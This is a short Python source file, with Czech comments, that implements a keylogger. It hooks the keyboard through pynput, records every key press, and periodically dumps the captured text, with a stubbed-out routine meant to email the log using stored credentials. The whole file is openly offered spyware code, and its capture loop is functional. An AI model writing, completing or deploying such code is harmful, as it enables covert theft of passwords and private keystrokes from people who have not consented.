import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText
import time

class Keylogger:
    def __init__(self, time_interval=60, email="", password=""):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password
    
    def append_to_log(self, string):
        self.log += string
    
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = f" [{key}] "
        self.append_to_log(current_key)
    
    def report(self):
        if self.log:
            # Můžeš poslat emailem nebo uložit do souboru
            print(f"\n[Captured data]: {self.log}")
            if self.email and self.password:
                self.send_mail(self.log)
            self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
    
    def send_mail(self, message):
        # Implementace odeslání emailu
        pass
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

# Spuštění keyloggeru
# keylogger = Keylogger(time_interval=30)
# keylogger.start()
